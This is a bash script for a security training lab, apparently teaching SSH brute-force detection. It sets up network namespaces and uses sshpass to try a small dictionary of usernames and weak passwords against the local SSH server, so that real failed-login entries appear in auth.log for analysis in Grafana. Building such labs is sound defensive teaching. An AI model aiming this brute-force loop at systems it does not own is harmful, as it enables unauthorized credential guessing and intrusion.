#!/usr/bin/env bash
# Lab7：SSH 暴力破解检测与溯源
# 用临时网络命名空间发起真实 SSH 密码尝试，由 sshd/PAM 自己写入 /var/log/auth.log。
# 本脚本不伪造、不追加任何日志行。
# 用法：sudo bash attack.sh [--user 用户名]
set -euo pipefail

LAB_NAME="Lab7"
NETNS_A="lab7-atk-a"
NETNS_B="lab7-atk-b"
VETH_A="lab7-veth-a"
VETH_B="lab7-veth-b"
SRC_A="203.0.113.21"
SRC_B="198.51.100.77"
DEST_A="10.99.1.1"
DEST_B="10.99.2.1"

TARGET_USER="${SUDO_USER:-$(id -un)}"
if [ "${1:-}" = "--user" ] && [ -n "${2:-}" ]; then
  TARGET_USER="$2"
fi

log() { printf '[%s] %s\n' "$LAB_NAME" "$*"; }

need_root() {
  if [ "$(id -u)" -ne 0 ]; then
    echo "请使用 sudo 运行本脚本。" >&2
    exit 1
  fi
}

cleanup() {
  ip netns del "$NETNS_A" 2>/dev/null || true
  ip netns del "$NETNS_B" 2>/dev/null || true
  ip link del "$VETH_A" 2>/dev/null || true
  ip link del "$VETH_B" 2>/dev/null || true
  ip addr del 127.0.0.2/8 dev lo 2>/dev/null || true
  ip addr del 127.0.0.3/8 dev lo 2>/dev/null || true
}

setup_netns() {
  local ns="$1" src="$2" host_veth="$3" ns_veth="$4" host_ip="$5"
  ip netns add "$ns"
  ip link add "$host_veth" type veth peer name "$ns_veth"
  ip link set "$ns_veth" netns "$ns"
  ip addr add "${host_ip}/24" dev "$host_veth"
  ip link set "$host_veth" up
  ip netns exec "$ns" ip link set lo up
  ip netns exec "$ns" ip addr add "${src}/24" dev "$ns_veth"
  ip netns exec "$ns" ip link set "$ns_veth" up
  ip netns exec "$ns" ip route add "${host_ip%.*}.0/24" dev "$ns_veth"
  ip route add "${src%.*}.0/24" dev "$host_veth"
}

run_attempt() {
  local ns="$1" src="$2" dest="$3" user="$4" pass="$5"
  local ssh_opts=(
    -F /dev/null -4 -b "$src"
    -o StrictHostKeyChecking=no
    -o UserKnownHostsFile=/dev/null
    -o PreferredAuthentications=password
    -o PubkeyAuthentication=no
    -o NumberOfPasswordPrompts=1
    -o ConnectTimeout=5
  )
  if [ "$MODE" = "netns" ]; then
    ip netns exec "$ns" sshpass -p "$pass" ssh "${ssh_opts[@]}" "$user@$dest" true >/dev/null 2>&1 || true
  else
    sshpass -p "$pass" ssh "${ssh_opts[@]}" "$user@$dest" true >/dev/null 2>&1 || true
  fi
  sleep 0.3
}

need_root
trap cleanup EXIT

if ! systemctl is-active --quiet ssh; then
  echo "SSH 服务未运行，无法发起攻击。请先执行 systemctl status ssh。" >&2
  exit 1
fi

if ! command -v sshpass >/dev/null 2>&1; then
  log "未找到 sshpass，正在安装……"
  apt-get update -qq
  apt-get install -y -qq sshpass
fi

# 清理上次中断留下的同名 netns/veth。
cleanup

MODE="netns"
if ! ip netns add lab7-probe 2>/dev/null; then
  MODE="loopback"
else
  ip netns del lab7-probe
fi

if [ "$MODE" = "netns" ]; then
  setup_netns "$NETNS_A" "$SRC_A" "$VETH_A" "veth-a-ns" "$DEST_A"
  setup_netns "$NETNS_B" "$SRC_B" "$VETH_B" "veth-b-ns" "$DEST_B"
else
  log "当前环境无法创建网络命名空间，改用回环别名模式。"
  log "来源 IP 将变为 127.0.0.2/127.0.0.3；分析方法相同，报告中注明即可。"
  ip addr add 127.0.0.2/8 dev lo
  ip addr add 127.0.0.3/8 dev lo
  SRC_A="127.0.0.2"
  SRC_B="127.0.0.3"
  DEST_A="127.0.0.1"
  DEST_B="127.0.0.1"
fi

A_USERS=("admin" "root" "$TARGET_USER")
A_PASSWORDS=("123456" "password" "admin123")
B_USERS=("oracle" "test")
B_PASSWORDS=("123456" "password")

log "被攻击账号：${TARGET_USER}（另含字典用户名 admin、root、oracle、test）"
log "来源 ${SRC_A}：${#A_USERS[@]} 个用户名 × ${#A_PASSWORDS[@]} 个密码"
for user in "${A_USERS[@]}"; do
  for pass in "${A_PASSWORDS[@]}"; do
    run_attempt "$NETNS_A" "$SRC_A" "$DEST_A" "$user" "$pass"
  done
done

log "来源 ${SRC_B}：${#B_USERS[@]} 个用户名 × ${#B_PASSWORDS[@]} 个密码"
for user in "${B_USERS[@]}"; do
  for pass in "${B_PASSWORDS[@]}"; do
    run_attempt "$NETNS_B" "$SRC_B" "$DEST_B" "$user" "$pass"
  done
done

TOTAL=$(( ${#A_USERS[@]} * ${#A_PASSWORDS[@]} + ${#B_USERS[@]} * ${#B_PASSWORDS[@]} ))
log "完成 ${TOTAL} 次真实 SSH 密码尝试。"
log "sshd/PAM 已自行写入 /var/log/auth.log；等待约 10 秒后到 Grafana Explore 查询："
log '  {job="auth"} |= "Failed password"'
log "如需清理攻击网络，执行：sudo bash restore.sh（脚本退出时也会自动清理）"
